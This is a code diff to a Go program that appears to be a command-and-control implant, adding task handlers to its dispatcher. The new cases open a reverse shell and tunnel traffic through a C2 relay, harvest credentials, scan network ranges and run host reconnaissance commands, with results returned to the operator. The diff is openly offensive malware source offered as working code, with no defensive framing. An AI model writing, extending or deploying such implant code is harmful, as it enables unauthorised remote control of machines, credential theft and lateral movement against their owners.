@@ -186,6 +186,72 @@ func executeTask(task proto.Task) proto.Result {
 			res.Error = err.Error()
 		}
 
+	case proto.TaskSOCKS5:
+		// SOCKS5 proxy is now handled server-side; agent only needs TaskForward.
+		res.Error = "socks5 task not used in this protocol version; use TaskForward"
+
+	case proto.TaskForward:
+		// Target: "host:port" to dial; Relay: C2 relay address to connect back to.
+		// We proxy data bidirectionally between the two connections.
+		if task.Target == "" {
+			res.Error = "forward: target required (host:port)"
+		} else if task.Relay == "" {
+			res.Error = "forward: relay address required"
+		} else {
+			if err := runRelay(task.Target, task.Relay); err != nil {
+				res.Error = err.Error()
+			}
+		}
+
+	case proto.TaskShell:
+		if task.Relay == "" {
+			res.Error = "shell: relay address required"
+		} else {
+			if err := runShellRelay(task.Relay); err != nil {
+				res.Error = err.Error()
+			}
+		}
+
+	case proto.TaskCreds:
+		out, err := harvestCreds()
+		if err != nil {
+			res.Error = err.Error()
+		} else {
+			res.Output = out
+		}
+
+	case proto.TaskScan:
+		if task.Target == "" {
+			res.Error = "scan: target CIDR required"
+		} else {
+			data, err := runNetScan(task.Target, task.Ports, task.TimeoutMs)
+			if err != nil {
+				res.Error = err.Error()
+			} else {
+				res.Output = data
+			}
+		}
+
+	case proto.TaskRecon:
+		// Run OS-specific recon and return structured JSON
+		if runtime.GOOS == "windows" {
+			data, err := runWindowsRecon()
+			if err != nil {
+				res.Error = fmt.Sprintf("windows recon: %v", err)
+			} else {
+				res.Output = data
+			}
+		} else {
+			// Linux/Unix: run the bash recon script via runShell
+			// This mirrors what PTY sessions do - run the full bash recon
+			out, err := runShell("id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -5")
+			if err != nil {
+				res.Error = fmt.Sprintf("recon: %v", err)
+			} else {
+				res.Output = out
+			}
+		}
+
 	default:
 		res.Error = fmt.Sprintf("unknown task kind: %s", task.Kind)
 	}
